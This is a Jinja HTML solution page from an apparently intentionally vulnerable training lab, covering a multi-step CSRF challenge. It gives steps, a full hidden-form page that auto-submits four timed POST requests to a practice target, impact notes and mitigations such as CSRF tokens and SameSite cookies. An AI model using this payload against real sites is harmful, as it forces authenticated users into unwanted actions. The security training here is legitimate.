{% extends 'base.html' %}

{% block title %}CSRF Level 10 Solution - R00tGlyph{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-10 offset-md-1">
        <div class="card">
            <div class="card-header bg-success text-white">
                <h2 class="text-center">
                    <i class="bi bi-lightbulb-fill me-2"></i>
                    Level 10 Solution: Multi-step CSRF Attack
                </h2>
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
                    <p>This challenge demonstrates how to exploit multi-step CSRF vulnerabilities in the WorkflowPro System, where multiple sequential requests are required to complete a workflow.</p>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-primary text-white">
                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
                    </div>
                    <div class="card-body">
                        <p><strong>Primary Tools:</strong> Burp Suite (for request chaining), Browser Developer Tools, Custom HTML/JavaScript</p>
                        <p><strong>Skills:</strong> Multi-step CSRF exploitation, Workflow analysis, Request sequencing</p>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-warning text-dark">
                        <h4 class="mb-0"><i class="bi bi-list-ol me-2"></i>Step-by-Step Solution</h4>
                    </div>
                    <div class="card-body">

                        <ol>
                            <li><strong>Analyze Workflow Steps:</strong> Identify that the WorkflowPro system requires 4 sequential steps to complete a workflow</li>
                            <li><strong>Map Request Sequence:</strong> Understand the required order: Step 1 → Step 2 → Step 3 → Step 4</li>
                            <li><strong>Create Chained CSRF:</strong> Build an HTML page that automatically submits all 4 steps in sequence</li>
                            <li><strong>Use JavaScript Timing:</strong> Implement delays between requests to ensure proper sequencing</li>
                            <li><strong>Test Workflow ID:</strong> Use a valid workflow ID like "workflow_12345" for the attack</li>
                            <li><strong>Execute Multi-step Attack:</strong> Host the malicious page and trick an authenticated user to visit it</li>
                        </ol>
                        <div class="alert alert-warning mt-3">
                            <strong>Key Insight:</strong> Multi-step CSRF attacks require careful timing and sequencing to maintain workflow state.
                        </div>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-success text-white">
                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h4>
                    </div>
                    <div class="card-body">
                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Multi-step CSRF Attack for WorkflowPro --&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;h3&gt;Processing your request...&lt;/h3&gt;

    &lt;!-- Step 1 Form --&gt;
    &lt;form id="step1" action="http://target.com/csrf/level10" method="POST" style="display:none;"&gt;
        &lt;input type="hidden" name="step_number" value="1"&gt;
        &lt;input type="hidden" name="step_data" value="Initialize workflow"&gt;
        &lt;input type="hidden" name="workflow_id" value="workflow_12345"&gt;
    &lt;/form&gt;

    &lt;!-- Step 2 Form --&gt;
    &lt;form id="step2" action="http://target.com/csrf/level10" method="POST" style="display:none;"&gt;
        &lt;input type="hidden" name="step_number" value="2"&gt;
        &lt;input type="hidden" name="step_data" value="Process data"&gt;
        &lt;input type="hidden" name="workflow_id" value="workflow_12345"&gt;
    &lt;/form&gt;

    &lt;!-- Step 3 Form --&gt;
    &lt;form id="step3" action="http://target.com/csrf/level10" method="POST" style="display:none;"&gt;
        &lt;input type="hidden" name="step_number" value="3"&gt;
        &lt;input type="hidden" name="step_data" value="Validate workflow"&gt;
        &lt;input type="hidden" name="workflow_id" value="workflow_12345"&gt;
    &lt;/form&gt;

    &lt;!-- Step 4 Form --&gt;
    &lt;form id="step4" action="http://target.com/csrf/level10" method="POST" style="display:none;"&gt;
        &lt;input type="hidden" name="step_number" value="4"&gt;
        &lt;input type="hidden" name="step_data" value="Complete workflow"&gt;
        &lt;input type="hidden" name="workflow_id" value="workflow_12345"&gt;
    &lt;/form&gt;

    &lt;script&gt;
    // Execute multi-step CSRF attack with timing
    setTimeout(() =&gt; document.getElementById('step1').submit(), 100);
    setTimeout(() =&gt; document.getElementById('step2').submit(), 1000);
    setTimeout(() =&gt; document.getElementById('step3').submit(), 2000);
    setTimeout(() =&gt; document.getElementById('step4').submit(), 3000);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-danger text-white">
                        <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
                    </div>
                    <div class="card-body">
                        <p>This CSRF vulnerability demonstrates how attackers can:</p>
                        <ul>
                            <li>Execute unauthorized actions on behalf of authenticated users</li>
                            <li>Bypass authentication mechanisms through cross-site requests</li>
                            <li>Potentially compromise user accounts and sensitive data</li>
                            <li>Perform state-changing operations without user consent</li>
                        </ul>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-success text-white">
                        <h4 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h4>
                    </div>
                    <div class="card-body">
                        <ul>
                            <li><strong>CSRF Tokens:</strong> Implement anti-CSRF tokens in all state-changing forms</li>
                            <li><strong>SameSite Cookies:</strong> Use SameSite cookie attributes to prevent cross-site requests</li>
                            <li><strong>Origin Validation:</strong> Verify the Origin and Referer headers</li>
                            <li><strong>Custom Headers:</strong> Require custom headers for AJAX requests</li>
                            <li><strong>Double Submit Cookies:</strong> Implement double submit cookie pattern</li>
                        </ul>
                    </div>
                </div>

                <div class="text-center mt-4">
                    <a href="/solutions/csrf9" class="btn btn-secondary me-2">
                        <i class="bi bi-arrow-left me-1"></i>Previous Solution
                    </a>
                    <a href="/csrf/level10" class="btn btn-primary me-2">
                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
                    </a>
                    <a href="/solutions/csrf11" class="btn btn-success">
                        <i class="bi bi-arrow-right me-1"></i>Next Solution
                    </a>
                    <a href="/challenges" class="btn btn-info ms-2">
                        <i class="bi bi-list me-1"></i>All Challenges
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}